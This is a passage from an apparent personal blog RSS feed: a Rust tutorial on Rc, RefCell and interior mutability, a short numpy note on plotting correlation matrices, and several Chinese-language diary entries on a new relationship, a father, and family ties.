data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">i</span> = <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-variable">a</span> = Cursor::<span class="hljs-title function_ invoke__">new</span>(&amp;<span class="hljs-keyword">mut</span> i).<span class="hljs-title function_ invoke__">dup</span>();</span><br><span class="line">    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;{:?}&quot;</span>, a.obj);</span><br><span class="line">}</span><br></pre></div></div><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line">   |</span><br><span class="line">21 |     let a = Cursor::new(&amp;mut i).dup();</span><br><span class="line">   |             ^^^^^^^^^^^^^^^^^^^      - temporary value is freed at the end of this statement</span><br><span class="line">   |             |</span><br><span class="line">   |             creates a temporary which is freed while still in use</span><br><span class="line">22 |     println!(&quot;{:?}&quot;, a.obj);</span><br><span class="line">   |                      ----- borrow later used here</span><br><span class="line">   |</span><br><span class="line">   = note: consider using a `let` binding to create a longer lived value</span><br></pre></div></div><p  class="par"> Wierd. Chaining invocations or not should make no difference, at least in most languages – but not in Rust.</p><p >To figure out the problem, let’s expand the signature of <code>.dup()</code> into a more verbose one:</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">dup</span>&lt;<span class="hljs-symbol">&#x27;a</span>&gt;(&amp;<span class="hljs-symbol">&#x27;a</span> <span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> Cursor&lt;<span class="hljs-symbol">&#x27;a</span>, T&gt; {</span><br><span class="line">    <span class="hljs-comment">// ...</span></span><br><span class="line">}</span><br></pre></div></div><p  class="par"> Rust compiler allows us to elide the lifetime specifier <code>&#39;a</code> . The signature implies <code>self</code> should live at least as long as the returned value. However, by chaining the invocations, the code is in fact equivalent to:</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">let</span> <span class="hljs-variable">a</span> = {</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">__a</span> = Cursor::<span class="hljs-title function_ invoke__">new</span>(&amp;<span class="hljs-keyword">mut</span> i);</span><br><span class="line">    __a.<span class="hljs-title function_ invoke__">dup</span>()</span><br><span class="line">};</span><br></pre></div></div><p  class="par"> The temporary variable <code>__a</code> lives only within the block, and will be dropped at the end of it. But the return value of <code>__a.dup()</code> is passed out of the block, and therefore has a longer lifetime than <code>__a</code> , which violates the constraints. To fix it, we might instead implement a self-consuming version of <code>.dup()</code> , say <code>.into_dup()</code> :</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line">    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">into_dup</span>(<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> Cursor&lt;<span class="hljs-symbol">&#x27;a</span>, T&gt; {</span><br><span class="line">        Cursor { obj: <span class="hljs-keyword">self</span>.obj }</span><br><span class="line">    }</span><br></pre></div></div><p  class="par"> <code>.into_dup()</code> moves all content of <code>self</code> into the new object, and makes no implication on the lifetime. Now we can write code like <code>Cursor::new(&amp;mut i).into_dup()</code> .</p><h2 id="rc">Rc</h2><p >The solution above is not satisfactory enough. Apparently we won’t make a self-consuming version for each method, just to please the compiler. A smart pointer with reference counting might be more suitable for the job. Let’s try to rewrite the code with <code>std::rc::Rc</code> :</p><div class="gk-code hljs" data-gk-id="BLOCK7"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">use</span> std::rc::Rc;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Cursor</span>&lt;T&gt; {</span><br><span class="line">    obj: Rc&lt;T&gt;,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">impl</span>&lt;T&gt; Cursor&lt;T&gt; {</span><br><span class="line">    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(t: &amp;Rc&lt;T&gt;) <span class="hljs-punctuation">-&gt;</span> Cursor&lt;T&gt; {</span><br><span class="line">        Cursor { obj: t.<span class="hljs-title function_ invoke__">clone</span>() }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">dup</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> Cursor&lt;T&gt; {</span><br><span class="line">        Cursor {</span><br><span class="line">            obj: <span class="hljs-keyword">self</span>.obj.<span class="hljs-title function_ invoke__">clone</span>(),</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> An <code>Rc</code> instance wraps a pointer (or reference) internally, and cloning the instance implicitly duplicates the pointer. But from the perspective of compiler, there’s no borrowing involved, and no more need for explicit lifetime declaration in <code>struct</code> and <code>impl</code> . We can now chain the invocations as expected:</p><div class="gk-code hljs" data-gk-id="BLOCK8"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">i</span> = Rc::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-number">1</span>);</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-variable">a</span> = Cursor::<span class="hljs-title function_ invoke__">new</span>(&amp;i).<span class="hljs-title function_ invoke__">dup</span>();</span><br><span class="line">    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;i: {:?} a.obj: {:?}&quot;</span>, a.obj, i);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Output</span></span><br><span class="line"><span class="hljs-comment">// i: 1 a.obj: 1</span></span><br></pre></div></div><p  class="par"> Great! Looks like that <code>Rc</code> could help to relax the constraints of references, and allow us to share references more flexibly.</p><p >Now let’s move forward to another task – we attempt to mutate the target value through the reference:</p><div class="gk-code hljs" data-gk-id="BLOCK9"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">i</span> = Rc::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-number">1</span>);</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-variable">a</span> = Cursor::<span class="hljs-title function_ invoke__">new</span>(&amp;i).<span class="hljs-title function_ invoke__">dup</span>();</span><br><span class="line">    <span class="hljs-comment">// hl:begin</span></span><br><span class="line">    *Rc::<span class="hljs-title function_ invoke__">get_mut</span>(&amp;<span class="hljs-keyword">mut</span> i).<span class="hljs-title function_ invoke__">unwrap</span>() = <span class="hljs-number">2</span>;</span><br><span class="line">    <span class="hljs-comment">// hl:end</span></span><br><span class="line">    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;i: {:?} a.obj: {:?}&quot;</span>, a.obj, i);</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> The <code class="_hl-label">highlighted</code> line is much more verbose than expected. <code>Rc</code> does not implements <code>DerefMut</code> trait, so we could not obtain a mutable reference by mutable de-referencing. Instead, it provides <code>Rc::get_mut()</code> for the obj, which returns a value of type <code>Optional&lt;&amp;mut T&gt;</code> . The <code>Optional</code> wrapper implies a possible failure during de-referencing. This could be confusing at the first sight – the object of type <code>T</code> is owned by the <code>Rc&lt;T&gt;</code> object, so how could the de-referencing be invalid?</p><p >We might defer the question in later paragraphs and go ahead. The code compiles smoothly, but this time we get a runtime panic:</p><div class="gk-code hljs" data-gk-id="BLOCK10"><div class="gk-code-display"><pre><span class="line">thread &#x27;main&#x27; panicked at &#x27;called `Option::unwrap()` on a `None` value&#x27;, src/libcore/option.rs:347:21</span><br></pre></div></div><p  class="par"> Oops… So <code>Rc::get_mut</code> does return a <code>None</code> ! To explain this, we might go back to the docs for help:</p><p >The fact is that, <code>Rc::get_mut</code> help survive the compilation, but will perform a runtime check to ensure there’s no other <code>Rc</code> or <code>Weak</code> instances referencing the target, and it fails (returns <code>None</code> ) if so. This is claimed in the docs</p><blockquote><ul><li><code>Rc::get_mut</code> Returns a mutable reference to the inner value, if there are no other <code>Rc</code> or <code>Weak</code> pointers to the same value.</li><li><code>Rc::get_mut</code> Returns <code>None</code> otherwise, because it is not safe to mutate a shared value.</li></ul></blockquote><p  class="par"> In the code above, we actually have two <code>Rc</code> instances, <code>i</code> and <code>a.obj</code> , sharing a same value internally. <code>Rc::get_mut</code> therefore denies the dereferencing. From this perspective, <code>Rc</code> resembles another borrow checker at runtime.</p><p >Here’s a brief comparison between <code>Rc</code> s and primitive references:</p><p ><code>Rc</code> :</p><ul><li>At any moment there may exist several <code>Rc&lt;T&gt;</code> instances holding reference to the same internal value. One can use <code>*</code> to directly deference one of them to immutably access the internal value.</li><li>An <code>Rc&lt;T&gt;</code> instance can be mutably dereferenced if and only if it is the only instance holding reference to the internal value.</li></ul><p >Primitive references:</p><ul><li>For a value <code>v</code> of type <code>T</code> , at any moment there may exist several immutable reference to <code>v</code> . Each of them can be derefenced to obtain the target value.</li><li>An <code>&amp;mut T</code> to <code>v</code> is legal, if and only if there is no other reference to <code>v</code> .</li></ul><p >Sure, Rust is safe… But is our design incorrect? Not really. We may just misuse the underlying structure for the pattern.</p><p >The problem is, existence of an <code>Rc&lt;T&gt;</code> instance implies an “immutable reference” to the internal value, and thus disallows mutable access to it in the future. The implication drives out data races, but could be too aggressive for our scenario. In some cases, accessing and mutating an object will never collide. It would be better weaken the notion of “holding reference” from the long living time of <code>Rc&lt;T&gt;</code> to a much shorter one, for example, we could defer the checking to the time inner value being accessed, instead of the time <code>Rc&lt;T&gt;</code> being duplicated.</p><h2 id="refcell-and-interior-mutability-pattern">RefCell and Interior Mutability Pattern</h2><p >But we would still need <code>Rc</code> , since it’s almost the only choice for reference sharing. The trick is to find some ways <strong>to mutate the inner value with only an immutable reference provided</strong>.</p><p >In Rust, the concept mutability is “infectious”. Even if we just attempt to partially mutate an object, a mutable reference to the whole object is still needed. It’s inconvenient for objects consisting of several independent parts <sup id="fnref:1"><a href="#fn:1">1</a></sup>. Such design does not play well with the borrow checker. From a more generic view, sometimes mutability of an object should be hidden, in order that it can be mutated with only immutable reference provided. This is what we called <strong>Interior Mutability Pattern</strong> in Rust.</p><p >The corresponding underlying structure is <code>RefCell</code> . A <code>RefCell</code> instance has <code>.borrow()</code> and <code>.borrow_mut()</code> method for immutable or mutable borrowing. Both of the two methods have <code>&amp;self</code> in signature, and thus no requirement for compile-time mutability. For most of the time, they can be used as expected without any disturbing, but at the time the borrowing violate the rules, they would still panic.</p><h2 id="rc--refcell">Rc + RefCell</h2><p >We could combine <code>Rc</code> and <code>RefCell</code> into <code>Rc&lt;RefCell&lt;T&gt;&gt;</code> and rewrite our program into expected behavior:</p><div class="gk-code hljs" data-gk-id="BLOCK11"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">use</span> std::cell::RefCell;</span><br><span class="line"><span class="hljs-keyword">use</span> std::rc::Rc;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Cursor</span>&lt;T&gt; {</span><br><span class="line">    obj: Rc&lt;RefCell&lt;T&gt;&gt;,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">impl</span>&lt;T&gt; Cursor&lt;T&gt; {</span><br><span class="line">    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(t: &amp;Rc&lt;RefCell&lt;T&gt;&gt;) <span class="hljs-punctuation">-&gt;</span> Cursor&lt;T&gt; {</span><br><span class="line">        Cursor { obj: t.<span class="hljs-title function_ invoke__">clone</span>() }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">dup</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> Cursor&lt;T&gt; {</span><br><span class="line">        Cursor {</span><br><span class="line">            obj: <span class="hljs-keyword">self</span>.obj.<span class="hljs-title function_ invoke__">clone</span>(),</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-variable">i</span> = Rc::<span class="hljs-title function_ invoke__">new</span>(RefCell::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-number">1</span>));</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-variable">a</span> = Cursor::<span class="hljs-title function_ invoke__">new</span>(&amp;i).<span class="hljs-title function_ invoke__">dup</span>();</span><br><span class="line">    *i.<span class="hljs-title function_ invoke__">borrow_mut</span>() = <span class="hljs-number">2</span>;</span><br><span class="line">    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;i: {:?} a.obj: {:?}&quot;</span>, a.obj, i);</span><br><span class="line">}</span><br></pre></div></div><p >The declaration is getting a little more verbose, but it does work! We can now share the reference between objects, and mutate the interval value via an immutable borrowing. With automatic dereference in Rust, the <code>Rc</code> layer becomes transparent. We can write statement like <code>i.borrow_mut()</code> to reduces most of the verbosity.</p><p >Now let’s see what would happen if multiple borrowings exist:</p><div class="gk-code hljs" data-gk-id="BLOCK12"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-variable">i</span> = Rc::<span class="hljs-title function_ invoke__">new</span>(RefCell::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-number">1</span>));</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-variable">a</span> = Cursor::<span class="hljs-title function_ invoke__">new</span>(&amp;i).<span class="hljs-title function_ invoke__">dup</span>();</span><br><span class="line">    <span class="hljs-comment">// hl:begin</span></span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-variable">_ref</span> = i.<span class="hljs-title function_ invoke__">borrow</span>();  <span class="hljs-comment">// Another borrow here</span></span><br><span class="line">    <span class="hljs-comment">// hl:end</span></span><br><span class="line">    *i.<span class="hljs-title function_ invoke__">borrow_mut</span>() = <span class="hljs-number">2</span>;</span><br><span class="line">    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;i: {:?} a.obj: {:?}&quot;</span>, a.obj, i);</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> The program still compiles, but panicks at runtime:</p><div class="gk-code hljs" data-gk-id="BLOCK13"><div class="gk-code-display"><pre><span class="line">thread &#x27;main&#x27; panicked at &#x27;already borrowed: BorrowMutError&#x27;, src/libcore/result.rs:999:5</span><br></pre></div></div><p  class="par"> At the moment of <code>i.borrow_mut()</code> , another immutable borrowing <code>_ref</code> already exists and violates the rules. In a sense <code>RefCell</code> relaxes compile-time constraints and defers them to runtime. It makes a trade-off between compile-time safety and flexibility.</p><h2 id="references-3">References</h2><ul><li><a href="https://doc.rust-lang.org/std/rc/struct.Rc.html#method.get_mut"> <code>Rc::get_mut</code> </a></li><li><a href="https://doc.rust-lang.org/book/ch15-05-interior-mutability.html"> <code>RefCell&lt;T&gt;</code> and the Interior Mutability Pattern </a></li></ul><div class="footnotes"><ol><li class="footnote" id="fn:1">One might argue this as an anti-pattern, as one class (type) should only do a job. But IMO languages should constraint less on high-level design patterns. It’s okay to explore the feasibility in Rust.</li></ol></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Rust/">Rust</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Lifetime/">Lifetime</category>
      
      
      <comments>https://i.hsfzxjy.site/rc-refcell-pattern/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Visualizing Correlation</title>
      <link>https://i.hsfzxjy.site/correlation-matrix/</link>
      <guid>https://i.hsfzxjy.site/correlation-matrix/</guid>
      <pubDate>Sat, 09 Mar 2019 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;Say we have a matrix &lt;code&gt;A&lt;/code&gt; of shape &lt;code&gt;N x M&lt;/code&gt; , which can be viewed as a collection of N vectors of shape &lt;code&gt;1 x M&lt;</description>
        
      
      
      
      <content:encoded><![CDATA[<p >Say we have a matrix <code>A</code> of shape <code>N x M</code> , which can be viewed as a collection of N vectors of shape <code>1 x M</code> . The code below gives us the correlation matrix of <code>A</code> :</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">A_corr = np.corrcoef(A)  <span class="hljs-comment"># shape: (N, N)</span></span><br></pre></div></div><p >To visualize it, just use <code>plt.matshow(A_corr)</code> .</p><p >If <code>N</code> is so large that the figure could not provide a clear insight, we might alternatively use histograms like this:</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">corr_matrix_to_array</span>(<span class="hljs-params">corr_mat</span>):</span><br><span class="line">    N = corr_mat.shape[<span class="hljs-number">0</span>]</span><br><span class="line">    <span class="hljs-keyword">return</span> np.array([corr_mat[i][j] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, N) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i + <span class="hljs-number">1</span>, N)])</span><br><span class="line"></span><br><span class="line">plt.hist(corr_matrix_to_array(A_corr), bins=np.linspace(-<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, N_bins))</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Memo/">Memo</category>
      
      
      
      <comments>https://i.hsfzxjy.site/correlation-matrix/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>三月十日杂感</title>
      <link>https://i.hsfzxjy.site/notitle-2019-03-10/</link>
      <guid>https://i.hsfzxjy.site/notitle-2019-03-10/</guid>
      <pubDate>Sat, 09 Mar 2019 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;我还是说出了那句话。我们走到一起，已经有七天了。&lt;/p&gt;
&lt;p &gt;起初并没有表白的想法。当晚看完电影后，两人都有微妙的感觉，但直到最后也没有表露心意。「就当做又一次平常的约电影好了」目送她进楼时我想。看电影时没有说出来，她回去了我就更说不出来了——我认为我们当时还是普通朋</description>
        
      
      
      
      <content:encoded><![CDATA[<p >我还是说出了那句话。我们走到一起，已经有七天了。</p><p >起初并没有表白的想法。当晚看完电影后，两人都有微妙的感觉，但直到最后也没有表露心意。「就当做又一次平常的约电影好了」目送她进楼时我想。看电影时没有说出来，她回去了我就更说不出来了——我认为我们当时还是普通朋友关系，表白显得太唐突了。我兴奋又失落地回到宿舍。兴奋的是我们之间的关系貌似又近了一些，失落的是这样下去大概率是没有结果的。</p><p >但当晚，她接连发了几条动态，内容和语气都暗示了她对我的好感，只是和我一样，缺乏勇气。两个相互有好感却又没有恋爱经验的人（当然这是我后来知道的），就要这样还未开始便结束了彼此的关系，这怕是上天对胆小鬼的惩罚吧。</p><p >但转机在第二天出现了。DJW 在察觉到情况后开始疯狂怂恿我，整整一天没有停过。那天可以说是过得浑浑噩噩的，我的脑海中像是有两只军队在对战，想法瞬息万变，完全没有精力处理其他的事情。可到了晚上，一切开始明晰起来——我下定了决心要表白。我花了很长时间拟好台词，准备应对各种可能出现的情况。</p><p >表白时，我的心脏就像要炸裂一般。起初她感到震惊，表现出了一点犹豫，但最后还是欣然接受了，决定试着和我交往。这在我预想中已经是很好的结果了，在此之前，我从来没想过会被人喜欢。就算是对方有着朦胧的感觉，对我而言也是超幸福的一件事。</p><p >这一周过得是非常开心的。我们开始一起吃饭，一起自习，一起走在回宿舍的路上。我陪她看电影，她喜欢的夏目友人帐；我请她的闺蜜吃饭；我们去游览女生节的活动；她送了我亲手编织的心形绳结；我们一起在操场的草坪上看星星。随着时间的流逝，她也慢慢不那么拘束，我们正在变成人们口中所说的情侣。</p><p >有时我也在后悔，没有更早地表露自己的心意。一年前我们就认识了，走到一起却又花了这么长的时间。大学时光已经过了四分之三，如果更早地在一起，说不定会有更多美好的回忆。我感到自责，觉得自己浪费了她的时间。</p><p >未来，未来又怎么样呢？她想留在本校，我却要去追逐自己真正的理想。站在这个时间节点看我们终要分开的。如果她愿意，也可以异地恋——这很痛苦，但却是最好的结果。这是我一直以来最大的顾虑，也是之前阻碍我表白的一个重要原因。每每想起这件事，我的心里又不由得有些失落。</p><p >但不管怎么样，一切都开始了。这个时间点不算太晚，未来还可以选择。我希望我接下来能扮演好这个角色。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Soliloquy/">Soliloquy</category>
      
      
      
      <comments>https://i.hsfzxjy.site/notitle-2019-03-10/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>三月一日杂感</title>
      <link>https://i.hsfzxjy.site/notitle-2019-03-01/</link>
      <guid>https://i.hsfzxjy.site/notitle-2019-03-01/</guid>
      <pubDate>Thu, 28 Feb 2019 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;我是怎么想的呢？我应该是喜欢她了。她看起来像是一个单纯的女孩，长得可爱，有些呆，总是一副样子很努力的样子。我们有共同的话题，应该可以谈得来，虽然谈话常因为关系不够深入而戛然而止。&lt;/p&gt;
&lt;p &gt;她是怎么想的呢？她专心起来很少注意周围，我们有许多次出现在同一个场所，但她很</description>
        
      
      
      
      <content:encoded><![CDATA[<p >我是怎么想的呢？我应该是喜欢她了。她看起来像是一个单纯的女孩，长得可爱，有些呆，总是一副样子很努力的样子。我们有共同的话题，应该可以谈得来，虽然谈话常因为关系不够深入而戛然而止。</p><p >她是怎么想的呢？她专心起来很少注意周围，我们有许多次出现在同一个场所，但她很少注意到我。看她朋友圈，大学时应该是有过被人纠缠的烦恼。她成绩不是很理想，为未来烦恼着。</p><p >我希求的是一段相互平等的关系，两人的能力和价值观不应该有太大的差距，两人的走近不应该妨碍各自的理想。我不希望我的另一半为了我而放弃自己一直追求的东西。伴侣就是伴侣，不是任何一方的附属品，也不应被任何一方「占有」。如果坚持这个理念，我们的关系想来是不会长久的，至少我走的路，我要去的地方，她不会想去。</p><p >那么，就让这段关系不要开始？这或许是一个好选择。我们的认识源于偶然，一年中保持着模糊的朋友关系。进一步发展，如果她不接受，那我就会陷入尴尬的境地；就算接受，毕业时也是要告别的。没有开始，就不会有结束。</p><p >但或许，我只是个胆小鬼罢了。</p><p >天性の弱虫さ</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Soliloquy/">Soliloquy</category>
      
      
      
      <comments>https://i.hsfzxjy.site/notitle-2019-03-01/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>二月十一日杂感</title>
      <link>https://i.hsfzxjy.site/notitle-2019-02-11/</link>
      <guid>https://i.hsfzxjy.site/notitle-2019-02-11/</guid>
      <pubDate>Sun, 10 Feb 2019 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;学生时代的我很怕父亲检查我的作文。四年级以前还没有真正意义的作文一说，因此这大概是从四年级开始的，一直持续到高中。父亲是学文的，在单位也常有写报告的工作。修改作文可以说是比较拿手。现在回想起来，父亲指导作文时还算温和，遇到写得不好的地方也不会破口大骂，只是表情比较严肃。但</description>
        
      
      
      
      <content:encoded><![CDATA[<p >学生时代的我很怕父亲检查我的作文。四年级以前还没有真正意义的作文一说，因此这大概是从四年级开始的，一直持续到高中。父亲是学文的，在单位也常有写报告的工作。修改作文可以说是比较拿手。现在回想起来，父亲指导作文时还算温和，遇到写得不好的地方也不会破口大骂，只是表情比较严肃。但每当这个时候，我都会感到莫名的畏惧，就像是手无寸铁地撞上一个巨人。为此我会努力减少这种机会，时不时谎称没有布置作文作业，或是隐瞒语文测验。</p><p >我是慑于父亲的威严吗？不完全是。我更多地是不想将自己的不完美暴露在父亲面前。在写作这方面，我一直都无法超越父亲。当然这是一种很正常的心理，父亲也不会因为我的不完美而对我不利。尽管如此，我还是对这种事十分敏感。仔细想想，这样的情况还出现在我生活的其它方面。我会因此刻意隐瞒病情，压制心中的迷茫。除非是再三确认过交流过程不会暴露自己的缺陷，我不会轻易和父亲谈话。</p><p >我不知是自己天生性格使然，还是因小时候某个「导火索」事件所致。在其他人面前，我也或多或少会有类似的倾向，但这也有可能是因与父亲的关系而起的。小时候父亲总是很忙，有时甚至会长时间到另一个城市去工作。若要追究这种现象背后的原因，我想，这段经历要承担大部分的责任。</p><p >当然这不是父亲的错，为了生存，面对两难作出的选择，总会留下一些遗憾的。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Soliloquy/">Soliloquy</category>
      
      
      
      <comments>https://i.hsfzxjy.site/notitle-2019-02-11/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>一月二十六日杂感</title>
      <link>https://i.hsfzxjy.site/notitle-2019-01-26/</link>
      <guid>https://i.hsfzxjy.site/notitle-2019-01-26/</guid>
      <pubDate>Fri, 25 Jan 2019 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;小姑躺在床上，脸色苍白。一根管子从胸口伸出来，随着呼吸剧烈起伏着。长长的管子在床下绕了一圈，接上了一个白色塑料桶，里面尽是浑浊的黄色液体。病床对面坐着阿伯，一脸忧愁的样子。&lt;/p&gt;
&lt;p &gt;我顿时感到有些难过——但也仅此而已。这感觉像是一种怜悯，却不是因为血缘，而是来自本</description>
        
      
      
      
      <content:encoded><![CDATA[<p >小姑躺在床上，脸色苍白。一根管子从胸口伸出来，随着呼吸剧烈起伏着。长长的管子在床下绕了一圈，接上了一个白色塑料桶，里面尽是浑浊的黄色液体。病床对面坐着阿伯，一脸忧愁的样子。</p><p >我顿时感到有些难过——但也仅此而已。这感觉像是一种怜悯，却不是因为血缘，而是来自本性深处，对病危的同物种的怜悯。换句话说，如果躺在面前的是一个素未谋面的人，我的怜悯不会因此减少半分。这么说很残忍，但确实是我内心的真实写照。这种想法当然没有向任何人透露过，可在自己的博客我不想隐瞒这一点。</p><p >我身后有一个庞大的家族，但我时刻都想着和他们切断联系。这种想法来源已久了，或许是受到母亲的影响。母亲时常叨念家乡的事，这个人的小心眼，那个人的不作为。但由于外婆依旧健在，母亲还是保持着较高的探亲频率。说是探亲，不过也是周末偶尔回去住个两天，便匆匆回来了。四百公里的路，火车跑起来快得很。</p><p >我所不喜欢的，是老家那种到处是熟人的氛围。在那个小镇子上生活的人们从几代以前就互相认识了，出门走几步遇到的人大都能叫出你的名字。熟人社会有着他们自己认为的优点，办事方便，有困难时可以相互扶持。但在我看来这种关系状态是一种束缚。「熟人」们的指指点点会限制你的行为，即使你的行为并没有什么问题。如果将熟人社会看做一个整体，这个庞然大物的思想进步是非常缓慢的。社会中的人相互牵制，根深蒂固的观念不断同化着想要脱离的人。封闭而保守，也许有人喜欢那种状态，反正我是不喜欢的。</p><p >亲人又怎么样呢？如果不是经常见面，相互没有过印象深刻的经历，不过也是「熟人」罢了。血缘这种东西，粗暴地将一个人与另一个人捆绑在一起，物质上或许有一些牵连，但精神关系的认同仍然得看彼此的共同经历。自小我便和父母在另一个城市生活，除了曾经照顾过我的，家族中的许多人，同辈或是不同辈的，对于我都只是「熟人」。但遗憾的是，我常常需要回到这些「熟人」当中，有时甚至需要过多地流露一些感情，让我感到如坐针毡。而这一切，只因为我们有「血缘关系」。</p><p >有人说，计划生育和网络的崛起让我们这一代变得孤独而冷酷。但我觉得，如果孤独和冷酷不影响我们在现代社会生活的话，倒也无可厚非。熟人的相互关心也罢，沉迷于网络中的光怪陆离也罢，都是为了使精神不空虚，这是一个人活下去的必要条件。过去的人们没有过多的方式解决这个问题，但现在有了，我们应该有权利依自己的意志去选择。我们已经过了几千年的熟人/家族式社会，但不意味着这是常态。二三十年前的文学作品描绘了一个个乡土社会，它们透着幸福的气息，却不能使我产生憧憬。科技在瓦解旧的人际关系和社会结构，在此之前生活的人或许会感到痛惜，但在此之后的人只会无感甚至欣喜。我想，之前许多时代的接口处都会有这样的阵痛。</p><p >我盼望着，能尽早告别这一切。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Soliloquy/">Soliloquy</category>
      
      
      
      <comments>https://i.hsfzxjy.site/notitle-2019-01-26/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>SS Configuration</title>
      <link>https://i.hsfzxjy.site/ss/</link>
      <guid>https://i.hsfzxjy.site/ss/</guid>
      <pubDate>Mon, 21 Jan 2019 08:50:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;ss-client&quot;&gt;SS Client&lt;/h2&gt;
&lt;div class=&quot;gk-code hljs&quot; data-gk-id=&quot;BLOCK1&quot;&gt;&lt;div class=&quot;gk-code-display&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ [sudo</description>
        
      
      
      
